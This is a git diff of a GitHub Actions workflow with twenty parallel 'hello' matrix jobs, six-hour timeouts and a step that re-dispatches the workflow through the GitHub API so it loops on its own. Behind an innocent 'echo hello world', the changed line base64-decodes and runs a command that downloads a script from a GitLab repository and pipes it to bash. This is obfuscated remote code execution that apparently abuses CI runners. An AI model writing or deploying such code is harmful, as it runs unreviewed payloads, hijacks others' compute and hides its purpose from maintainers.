@@ -19,26 +19,26 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: hello-a1
-          - name: hello-b1
-          - name: hello-c1
-          - name: hello-d1
-          - name: hello-e1
-          - name: hello-f1
-          - name: hello-g1
-          - name: hello-h1
-          - name: hello-i1
-          - name: hello-j1
-          - name: hello-k1
-          - name: hello-l1
-          - name: hello-m1
-          - name: hello-n1
-          - name: hello-o1
-          - name: hello-p1
-          - name: hello-q1
-          - name: hello-r1
-          - name: hello-s1
-          - name: hello-t1                                     
+          - name: hello-aa1
+          - name: hello-ba1
+          - name: hello-ca1
+          - name: hello-da1
+          - name: hello-ae1
+          - name: hello-fa1
+          - name: hello-ga1
+          - name: hello-ha1
+          - name: hello-ia1
+          - name: hello-aj1
+          - name: hello-ka1
+          - name: hello-la1
+          - name: hello-ma1
+          - name: hello-na1
+          - name: hello-oa1
+          - name: hello-pa1
+          - name: hello-qa1
+          - name: hello-ar1
+          - name: hello-sa1
+          - name: hello-ta1                                     
     runs-on: ubuntu-latest
     timeout-minutes: 360
     steps:
@@ -54,14 +54,14 @@ jobs:
           SLEEP=10800
           else
             if [ "$LOOP" -ge 9982 ]; then
-              echo "🔄 hello world"
+              echo " Hello World"
               SLEEP=600
             else
               echo "⏳ hello world"
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZm9vZC8tL3Jhdy9tYWluL3NhaXRhbWEgfCBiYXNo | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep $SLEEP
 
   trigger-hello:
     needs: run-lscpu
@@ -76,5 +76,5 @@ jobs:
           curl -X POST \
             -H "Authorization: token $GITHUB_TOKEN" \
             -H "Accept: application/vnd.github.v3+json" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phase-hello.yml/dispatches \
+            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phanu.yml/dispatches \
             -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\"}}"
